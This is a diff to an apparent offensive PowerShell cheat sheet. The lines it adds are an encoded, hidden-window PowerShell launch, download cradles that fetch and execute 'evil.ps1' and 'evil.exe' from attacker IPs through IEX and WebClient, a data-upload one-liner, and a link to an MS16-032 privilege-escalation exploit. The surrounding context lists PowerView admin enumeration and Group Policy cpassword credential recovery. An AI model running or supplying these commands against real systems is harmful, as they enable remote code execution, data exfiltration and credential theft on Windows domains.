@@ -1,7 +1,9 @@
 PowerShell
 
 
-C:\> powershell.exe -exec bypass        Start PowerShell and turn off the execution policy.
+C:\> powershell.exe -exec bypass        Start PowerShell bypass execution policy.
+C:\> powershell.exe -NoP -sta -NonI -W Hidden -Enc <code>
+
 PS C:\> mode 300                        Full screen.
 PS C:\> Get-Command                     Show all commands.
 PS C:\> Get- <tab>                      Tab through each command.
@@ -51,6 +53,16 @@ PS C:\> PSDrive
 PS C:\> Remove-PSDrive S
 ------------------------------------------------------------------------------------------------------
 
+# Download file
+IEX(New-Object System.Net.Webclient).DownloadString(‘http://10.0.0.10/evil.ps1’)
+
+# Download file to disk
+IEX(New-Object System.Net.Webclient).DownloadFile(‘http://10.1.1.100/evil.exe’, ‘good.exe’)
+
+# Upload file
+IEX(New-Object System.Net.Webclient).UploadString(‘http://10.0.0.10/evil.ps1’,”<PostDATA>”)
+------------------------------------------------------------------------------------------------------
+
 # Who are your admins
 
 PS C:\> Import-Module powerview.ps1
@@ -83,3 +95,10 @@ PS C:\> Get-GPPPassword
 \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
 Search xml files for cpassword.
 PS C:\> GetDecryptedCpassword 'AES 256-bit encrypted password'
+------------------------------------------------------------------------------------------------------
+
+# MS16-032
+https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
+
+
+
